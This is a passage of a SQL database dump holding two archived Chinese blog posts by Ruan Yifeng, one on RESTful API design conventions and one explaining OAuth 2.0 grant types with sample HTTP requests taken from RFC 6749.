AKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-29 04:01:28', '2014-05-22 12:54:31', 0, '[["API", 0.38832191424733176], ["com", 0.18029231732911832], ["api", 0.16642367753457077], ["zoos", 0.16642367753457077], ["https", 0.15255503774002319], ["\\u8fd4\\u56de", 0.1464694213186543], ["\\u670d\\u52a1\\u5668", 0.1419449381312297], ["collection", 0.13868639794547563], ["example", 0.12481775815092808], ["GET", 0.12481775815092808], ["ID", 0.12481775815092808], ["\\u7528\\u6237", 0.11871814511171694], ["\\u52a8\\u7269\\u56ed", 0.10861678090923432], ["\\u8d44\\u6e90", 0.09330144377227377], ["\\u4fe1\\u606f", 0.09142449001339908], ["HTTP", 0.08321183876728538], ["DELETE", 0.08321183876728538], ["RESTful", 0.08321183876728538], ["\\u6307\\u5b9a", 0.0800927629211137], ["\\u6587\\u6863", 0.06952659846786544]]', NULL, NULL, '网络应用程序，分为前端和后端两个部分。当前的发展趋势，就是前端设备层出不穷（手机、平板、桌面电脑、其他专用设备......）。 因此，必须有一种统一的机制，方便不同的前端设备与后端进行通信。这导致API构架的流行，甚至出现"API First"的设计思想。RESTful API是目前比较成熟的一套互联网应用程序的API设计理论。我以前写过一篇《理解RESTful架构》，探讨如何理解这个概念。 今天，我将介绍RESTful API的设计细节，探讨如何设计一套合理、好用的API。我的主要参考了两篇文章（1，2）。 一、协议 API与用户的通信协议，总是使用HTTPs协议。 二、域名 应该尽量将API部署在专用域名之下。 https://api.example.com 如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。 https://example.org/api/ 三、版本（Versioning） 应该将API的版本号放入URL。 https://api.example.com/v1/ 另一种做法是，将版本号放在HTTP头信息中，但不如放入URL方便和直观。Github采用这种做法。 四、路径（Endpoint） 路径又称"终点"（endpoint），表示API的具体网址。 在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的"集合"（collection），所以API中的名词也应该使用复数。 举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。 https://api.example.com/v1/zoos https://api.example.com/v1/animals https://api.example.com/v1/employees 五、HTTP动词 对于资源的具体操作类型，由HTTP动词表示。 常用的HTTP动词有下面五个（括号里是对应的SQL命令）。 GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。 PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。 DELETE（DELETE）：从服务器删除资源。 还有两个不常用的HTTP动词。 HEAD：获取资源的元数据。 OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。 下面是一些例子。 GET /zoos：列出所有动物园 POST /zoos：新建一个动物园 GET /zoos/ID：获取某个指定动物园的信息 PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息） PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/ID：删除某个动物园 GET /zoos/ID/animals：列出某个指定动物园的所有动物 DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物 六、过滤信息（Filtering） 如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。 下面是一些常见的参数。 ?limit=10：指定返回记录的数量 ?offset=10：指定返回记录的开始位置。 ?page=2&per_page=100：指定第几页，以及每页的记录数。 ?sortby=name&order=asc：指定返回结果按照哪个属性排序，以及排序顺序。 ?animal_type_id=1：指定筛选条件 参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。 七、状态码（Status Codes） 服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。 200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。 201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。 202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务） 204 NO CONTENT - [DELETE]：用户删除数据成功。 400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。 401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。 403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。 404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。 406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。 410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。 422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。 500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。 状态码的完全列表参见这里。 八、错误处理（Error handling） 如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。 { error: "Invalid API key" } 九、返回结果 针对不同操作，服务器向用户返回的结果应该符合以下规范。 GET /collection：返回资源对象的列表（数组） GET /collection/resource：返回单个资源对象 POST /collection：返回新生成的资源对象 PUT /collection/resource：返回完整的资源对象 PATCH /collection/resource：返回完整的资源对象 DELETE /collection/resource：返回一个空文档 十、Hypermedia API RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。 比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档。 {"link": { "rel": "collection https://www.example.com/zoos", "href": "https://api.example.com/zoos", "title": "List of zoos", "type": "application/vnd.yourformat+json" }} 上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型。 Hypermedia API的设计被称为HATEOAS。Github的API就是这种设计，访问api.github.com会得到一个所有可用API的网址列表。 { "current_user_url": "https://api.github.com/user", "authorizations_url": "https://api.github.com/authorizations", // ... } 从上面可以看到，如果想获取当前用户的信息，应该去访问api.github.com/user，然后就得到了下面结果。 { "message": "Requires authentication", "documentation_url": "https://developer.github.com/v3" } 上面代码表示，服务器给出了提示信息，以及文档的网址。 十一、其他 （1）API的身份认证应该使用OAuth 2.0框架。 （2）服务器返回的数据格式，应该尽量使用JSON，避免使用XML。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年5月22日 更多内容： 档案 » 开发者手册 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(23, 'http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html', '理解OAuth 2.0', '<p><a href="http://en.wikipedia.org/wiki/OAuth">OAuth</a>是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。</p>\n\n        <p>本文对OAuth 2.0的设计思路和运行流程，做一个简明通俗的解释，主要参考材料为<a href="http://www.rfcreader.com/#rfc6749">RFC 6749</a>。</p>\n\n<p><img alt="OAuth Logo" src="http://image.beekka.com/blog/2014/bg2014051201.png" title="" /></p>\n\n<h2>一、应用场景</h2>\n\n<p>为了理解OAuth的适用场合，让我举一个假设的例子。</p>\n\n<p>有一个"云冲印"的网站，可以将用户储存在Google的照片，冲印出来。用户为了使用该服务，必须让"云冲印"读取自己储存在Google上的照片。</p>\n\n<p><img alt="云冲印" src="http://image.beekka.com/blog/2014/bg2014051202.png" title="" /></p>\n\n<p>问题是只有得到用户的授权，Google才会同意"云冲印"读取这些照片。那么，"云冲印"怎样获得用户的授权呢？</p>\n\n<p>传统方法是，用户将自己的Google用户名和密码，告诉"云冲印"，后者就可以读取用户的照片了。这样的做法有以下几个严重的缺点。</p>\n\n<blockquote>\n  <p>（1）"云冲印"为了后续的服务，会保存用户的密码，这样很不安全。</p>\n\n<p>（2）Google不得不部署密码登录，而我们知道，单纯的密码登录并不安全。</p>\n\n<p>（3）"云冲印"拥有了获取用户储存在Google所有资料的权力，用户没法限制"云冲印"获得授权的范围和有效期。</p>\n\n<p>（4）用户只有修改密码，才能收回赋予"云冲印"的权力。但是这样做，会使得其他所有获得用户授权的第三方应用程序全部失效。</p>\n\n<p>（5）只要有一个第三方应用程序被破解，就会导致用户密码泄漏，以及所有被密码保护的数据泄漏。</p>\n</blockquote>\n\n<p>OAuth就是为了解决上面这些问题而诞生的。</p>\n\n<h2>二、名词定义</h2>\n\n<p>在详细讲解OAuth 2.0之前，需要了解几个专用名词。它们对读懂后面的讲解，尤其是几张图，至关重要。</p>\n\n<blockquote>\n  <p>（1） <strong>Third-party application</strong>：第三方应用程序，本文中又称"客户端"（client），即上一节例子中的"云冲印"。</p>\n\n<p>（2）<strong>HTTP service</strong>：HTTP服务提供商，本文中简称"服务提供商"，即上一节例子中的Google。</p>\n\n<p>（3）<strong>Resource Owner</strong>：资源所有者，本文中又称"用户"（user）。</p>\n\n<p>（4）<strong>User Agent</strong>：用户代理，本文中就是指浏览器。</p>\n\n<p>（5）<strong>Authorization server</strong>：认证服务器，即服务提供商专门用来处理认证的服务器。</p>\n\n<p>（6）<strong>Resource server</strong>：资源服务器，即服务提供商存放用户生成的资源的服务器。它与认证服务器，可以是同一台服务器，也可以是不同的服务器。</p>\n</blockquote>\n\n<p>知道了上面这些名词，就不难理解，OAuth的作用就是让"客户端"安全可控地获取"用户"的授权，与"服务商提供商"进行互动。</p>\n\n<h2>三、OAuth的思路</h2>\n\n<p>OAuth在"客户端"与"服务提供商"之间，设置了一个授权层（authorization layer）。"客户端"不能直接登录"服务提供商"，只能登录授权层，以此将用户与客户端区分开来。"客户端"登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</p>\n\n<p>"客户端"登录授权层以后，"服务提供商"根据令牌的权限范围和有效期，向"客户端"开放用户储存的资料。</p>\n\n<h2>四、运行流程</h2>\n\n<p>OAuth 2.0的运行流程如下图，摘自RFC 6749。</p>\n\n<p><img alt="OAuth运行流程" src="http://image.beekka.com/blog/2014/bg2014051203.png" title="" /></p>\n\n<blockquote>\n  <p>（A）用户打开客户端以后，客户端要求用户给予授权。</p>\n\n<p>（B）用户同意给予客户端授权。</p>\n\n<p>（C）客户端使用上一步获得的授权，向认证服务器申请令牌。</p>\n\n<p>（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌。</p>\n\n<p>（E）客户端使用令牌，向资源服务器申请获取资源。</p>\n\n<p>（F）资源服务器确认令牌无误，同意向客户端开放资源。</p>\n</blockquote>\n\n<p>不难看出来，上面六个步骤之中，B是关键，即用户怎样才能给于客户端授权。有了这个授权以后，客户端就可以获取令牌，进而凭令牌获取资源。</p>\n\n<p>下面一一讲解客户端获取授权的四种模式。</p>\n\n<h2>五、客户端的授权模式</h2>\n\n<p>客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式。</p>\n\n<ul>\n<li>授权码模式（authorization code）</li>\n<li>简化模式（implicit）</li>\n<li>密码模式（resource owner password credentials）</li>\n<li>客户端模式（client credentials）</li>\n</ul>\n\n<h2>六、授权码模式</h2>\n\n<p>授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与"服务提供商"的认证服务器进行互动。</p>\n\n<p><img alt="授权码模式" src="http://image.beekka.com/blog/2014/bg2014051204.png" title="" /></p>\n\n<p>它的步骤如下：</p>\n\n<blockquote>\n  <p>（A）用户访问客户端，后者将前者导向认证服务器。</p>\n\n<p>（B）用户选择是否给予客户端授权。</p>\n\n<p>（C）假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI），同时附上一个授权码。</p>\n\n<p>（D）客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</p>\n\n<p>（E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。</p>\n</blockquote>\n\n<p>下面是上面这些步骤所需要的参数。</p>\n\n<p>A步骤中，客户端申请认证的URI，包含以下参数：</p>\n\n<ul>\n<li>response_type：表示授权类型，必选项，此处的值固定为"code"</li>\n<li>client_id：表示客户端的ID，必选项</li>\n<li>redirect_uri：表示重定向URI，可选项</li>\n<li>scope：表示申请的权限范围，可选项</li>\n<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\nGET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz\n        &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1\nHost: server.example.com\n\n</code></pre></blockquote>\n\n<p>C步骤中，服务器回应客户端的URI，包含以下参数：</p>\n\n<ul>\n<li>code：表示授权码，必选项。该码的有效期应该很短，通常设为10分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系。</li>\n<li>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\nHTTP/1.1 302 Found\nLocation: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA\n          &amp;state=xyz\n\n</code></pre></blockquote>\n\n<p>D步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数：</p>\n\n<ul>\n<li>grant_type：表示使用的授权模式，必选项，此处的值固定为"authorization_code"。</li>\n<li>code：表示上一步获得的授权码，必选项。</li>\n<li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。</li>\n<li>client_id：表示客户端ID，必选项。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\nPOST /token HTTP/1.1\nHost: server.example.com\nAuthorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA\n&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb\n\n</code></pre></blockquote>\n\n<p>E步骤中，认证服务器发送的HTTP回复，包含以下参数：</p>\n\n<ul>\n<li>access_token：表示访问令牌，必选项。</li>\n<li>token_type：表示令牌类型，该值大小写不敏感，必选项，可以是bearer类型或mac类型。</li>\n<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。</li>\n<li>refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。</li>\n<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n     HTTP/1.1 200 OK\n     Content-Type: application/json;charset=UTF-8\n     Cache-Control: no-store\n     Pragma: no-cache\n\n     {\n       "access_token":"2YotnFZFEjr1zCsicMWpAA",\n       "token_type":"example",\n       "expires_in":3600,\n       "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",\n       "example_parameter":"example_value"\n     }\n\n</code></pre></blockquote>\n\n<p>从上面代码可以看到，相关参数使用JSON格式发送（Content-Type: application/json）。此外，HTTP头信息中明确指定不得缓存。</p>\n\n<h2>七、简化模式</h2>\n\n<p>简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了"授权码"这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。</p>\n\n<p><img alt="简化模式" src="http://image.beekka.com/blog/2014/bg2014051205.png" title="" /></p>\n\n<p>它的步骤如下：</p>\n\n<blockquote>\n  <p>（A）客户端将用户导向认证服务器。</p>\n\n<p>（B）用户决定是否给于客户端授权。</p>\n\n<p>（C）假设用户给予授权，认证服务器将用户导向客户端指定的"重定向URI"，并在URI的Hash部分包含了访问令牌。</p>\n\n<p>（D）浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值。</p>\n\n<p>（E）资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌。</p>\n\n<p>（F）浏览器执行上一步获得的脚本，提取出令牌。</p>\n\n<p>（G）浏览器将令牌发给客户端。</p>\n</blockquote>\n\n<p>下面是上面这些步骤所需要的参数。</p>\n\n<p>A步骤中，客户端发出的HTTP请求，包含以下参数：</p>\n\n<ul>\n<li>response_type：表示授权类型，此处的值固定为"token"，必选项。</li>\n<li>client_id：表示客户端的ID，必选项。</li>\n<li>redirect_uri：表示重定向的URI，可选项。</li>\n<li>scope：表示权限范围，可选项。</li>\n<li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n    GET /authorize?response_type=token&amp;client_id=s6BhdRkqt3&amp;state=xyz\n        &amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1\n    Host: server.example.com\n\n</code></pre></blockquote>\n\n<p>C步骤中，认证服务器回应客户端的URI，包含以下参数：</p>\n\n<ul>\n<li>access_token：表示访问令牌，必选项。</li>\n<li>token_type：表示令牌类型，该值大小写不敏感，必选项。</li>\n<li>expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。</li>\n<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。</li>\n<li>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n     HTTP/1.1 302 Found\n     Location: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA\n               &amp;state=xyz&amp;token_type=example&amp;expires_in=3600\n\n</code></pre></blockquote>\n\n<p>在上面的例子中，认证服务器用HTTP头信息的Location栏，指定浏览器重定向的网址。注意，在这个网址的Hash部分包含了令牌。</p>\n\n<p>根据上面的D步骤，下一步浏览器会访问Location指定的网址，但是Hash部分不会发送。接下来的E步骤，服务提供商的资源服务器发送过来的代码，会提取出Hash中的令牌。</p>\n\n<h2>八、密码模式</h2>\n\n<p>密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向"服务商提供商"索要授权。</p>\n\n<p>在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。这通常用在用户对客户端高度信任的情况下，比如客户端是操作系统的一部分，或者由一个著名公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才能考虑使用这种模式。</p>\n\n<p><img alt="密码模式" src="http://image.beekka.com/blog/2014/bg2014051206.png" title="" /></p>\n\n<p>它的步骤如下：</p>\n\n<blockquote>\n  <p>（A）用户向客户端提供用户名和密码。</p>\n\n<p>（B）客户端将用户名和密码发给认证服务器，向后者请求令牌。</p>\n\n<p>（C）认证服务器确认无误后，向客户端提供访问令牌。</p>\n</blockquote>\n\n<p>B步骤中，客户端发出的HTTP请求，包含以下参数：</p>\n\n<ul>\n<li>grant_type：表示授权类型，此处的值固定为"password"，必选项。</li>\n<li>username：表示用户名，必选项。</li>\n<li>password：表示用户的密码，必选项。</li>\n<li>scope：表示权限范围，可选项。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n     POST /token HTTP/1.1\n     Host: server.example.com\n     Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\n     Content-Type: application/x-www-form-urlencoded\n\n     grant_type=password&amp;username=johndoe&amp;password=A3ddj3w\n\n</code></pre></blockquote>\n\n<p>C步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n     HTTP/1.1 200 OK\n     Content-Type: application/json;charset=UTF-8\n     Cache-Control: no-store\n     Pragma: no-cache\n\n     {\n       "access_token":"2YotnFZFEjr1zCsicMWpAA",\n       "token_type":"example",\n       "expires_in":3600,\n       "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",\n       "example_parameter":"example_value"\n     }\n\n</code></pre></blockquote>\n\n<p>上面代码中，各个参数的含义参见《授权码模式》一节。</p>\n\n<p>整个过程中，客户端不得保存用户的密码。</p>\n\n<h2>九、客户端模式</h2>\n\n<p>客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向"服务提供商"进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求"服务提供商"提供服务，其实不存在授权问题。</p>\n\n<p><img alt="客户端模式" src="http://image.beekka.com/blog/2014/bg2014051207.png" title="" /></p>\n\n<p>它的步骤如下：</p>\n\n<blockquote>\n  <p>（A）客户端向认证服务器进行身份认证，并要求一个访问令牌。</p>\n\n<p>（B）认证服务器确认无误后，向客户端提供访问令牌。</p>\n</blockquote>\n\n<p>A步骤中，客户端发出的HTTP请求，包含以下参数：</p>\n\n<ul>\n<li>grant<em>type：表示授权类型，此处的值固定为"client</em>credentials"，必选项。</li>\n<li>scope：表示权限范围，可选项。</li>\n</ul>\n\n<blockquote><pre><code class="language-http">\n     POST /token HTTP/1.1\n     Host: server.example.com\n     Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\n     Content-Type: application/x-www-form-urlencoded\n\n     grant_type=client_credentials\n\n</code></pre></blockquote>\n\n<p>认证服务器必须以某种方式，验证客户端身份。</p>\n\n<p>B步骤中，认证服务器向客户端发送访问令牌，下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n     HTTP/1.1 200 OK\n     Content-Type: application/json;charset=UTF-8\n     Cache-Control: no-store\n     Pragma: no-cache\n\n     {\n       "access_token":"2YotnFZFEjr1zCsicMWpAA",\n       "token_type":"example",\n       "expires_in":3600,\n       "example_parameter":"example_value"\n     }\n\n</code></pre></blockquote>\n\n<p>上面代码中，各个参数的含义参见《授权码模式》一节。</p>\n\n<h2>十、更新令牌</h2>\n\n<p>如果用户访问的时候，客户端的"访问令牌"已经过期，则需要使用"更新令牌"申请一个新的访问令牌。</p>\n\n<p>客户端发出更新令牌的HTTP请求，包含以下参数：</p>\n\n<ul>\n<li>grant<em>type：表示使用的授权模式，此处的值固定为"refresh</em>token"，必选项。</li>\n<li>refresh_token：表示早前收到的更新令牌，必选项。</li>\n<li>scope：表示申请的授权范围，不可以超出上一次申请的范围，如果省略该参数，则表示与上一次一致。</li>\n</ul>\n\n<p>下面是一个例子。</p>\n\n<blockquote><pre><code class="language-http">\n     POST /token HTTP/1.1\n     Host: server.example.com\n     Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW\n     Content-Type: application/x-www-form-urlencoded\n\n     grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA\n\n</code></pre></blockquote>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-05-12T21:07:52+08:00">2014年5月12日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/developer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 开发者手册</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAKOWlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanZZ3VFTXFofPvXd6oc0wAlKG3rvAANJ7k15FYZgZYCgDDjM0sSGiAhFFRJoiSFDEgNFQJFZEsRAUVLAHJAgoMRhFVCxvRtaLrqy89/Ly++Osb+2z97n77L3PWhcAkqcvl5cGSwGQyhPwgzyc6RGRUXTsAIABHmCAKQBMVka6X7B7CBDJy82FniFyAl8EAfB6WLwCcNPQM4BOB/+fpFnpfIHomAARm7M5GSwRF4g4JUuQLrbPipgalyxmGCVmvihBEcuJOWGRDT77LLKjmNmpPLaIxTmns1PZYu4V8bZMIUfEiK+ICzO5nCwR3xKxRoowlSviN+LYVA4zAwAUSWwXcFiJIjYRMYkfEuQi4uUA4EgJX3HcVyzgZAvEl3JJS8/hcxMSBXQdli7d1NqaQffkZKVwBALDACYrmcln013SUtOZvBwAFu/8WTLi2tJFRbY0tba0NDQzMv2qUP91829K3NtFehn4uWcQrf+L7a/80hoAYMyJarPziy2uCoDOLQDI3fti0zgAgKSobx3Xv7oPTTwviQJBuo2xcVZWlhGXwzISF/QP/U+Hv6GvvmckPu6P8tBdOfFMYYqALq4bKy0lTcinZ6QzWRy64Z+H+B8H/nUeBkGceA6fwxNFhImmjMtLELWbx+YKuGk8Opf3n5r4D8P+pMW5FonS+BFQY4yA1HUqQH7tBygKESDR+8Vd/6NvvvgwIH554SqTi3P/7zf9Z8Gl4iWDm/A5ziUohM4S8jMX98TPEqABAUgCKpAHykAd6ABDYAasgC1wBG7AG/iDEBAJVgMWSASpgA+yQB7YBApBMdgJ9oBqUAcaQTNoBcdBJzgFzoNL4Bq4AW6D+2AUTIBnYBa8BgsQBGEhMkSB5CEVSBPSh8wgBmQPuUG+UBAUCcVCCRAPEkJ50GaoGCqDqqF6qBn6HjoJnYeuQIPQXWgMmoZ+h97BCEyCqbASrAUbwwzYCfaBQ+BVcAK8Bs6FC+AdcCXcAB+FO+Dz8DX4NjwKP4PnEIAQERqiihgiDMQF8UeikHiEj6xHipAKpAFpRbqRPuQmMorMIG9RGBQFRUcZomxRnqhQFAu1BrUeVYKqRh1GdaB6UTdRY6hZ1Ec0Ga2I1kfboL3QEegEdBa6EF2BbkK3oy+ib6Mn0K8xGAwNo42xwnhiIjFJmLWYEsw+TBvmHGYQM46Zw2Kx8lh9rB3WH8vECrCF2CrsUexZ7BB2AvsGR8Sp4Mxw7rgoHA+Xj6vAHcGdwQ3hJnELeCm8Jt4G749n43PwpfhGfDf+On4Cv0CQJmgT7AghhCTCJkIloZVwkfCA8JJIJKoRrYmBRC5xI7GSeIx4mThGfEuSIemRXEjRJCFpB+kQ6RzpLuklmUzWIjuSo8gC8g5yM/kC+RH5jQRFwkjCS4ItsUGiRqJDYkjiuSReUlPSSXK1ZK5kheQJyeuSM1J4KS0pFymm1HqpGqmTUiNSc9IUaVNpf+lU6RLpI9JXpKdksDJaMm4ybJkCmYMyF2TGKQhFneJCYVE2UxopFykTVAxVm+pFTaIWU7+jDlBnZWVkl8mGyWbL1sielh2lITQtmhcthVZKO04bpr1borTEaQlnyfYlrUuGlszLLZVzlOPIFcm1yd2WeydPl3eTT5bfJd8p/1ABpaCnEKiQpbBf4aLCzFLqUtulrKVFS48vvacIK+opBimuVTyo2K84p6Ss5KGUrlSldEFpRpmm7KicpFyufEZ5WoWiYq/CVSlXOavylC5Ld6Kn0CvpvfRZVUVVT1Whar3qgOqCmrZaqFq+WpvaQ3WCOkM9Xr1cvUd9VkNFw08jT6NF454mXpOhmai5V7NPc15LWytca6tWp9aUtpy2l3audov2Ax2yjoPOGp0GnVu6GF2GbrLuPt0berCehV6iXo3edX1Y31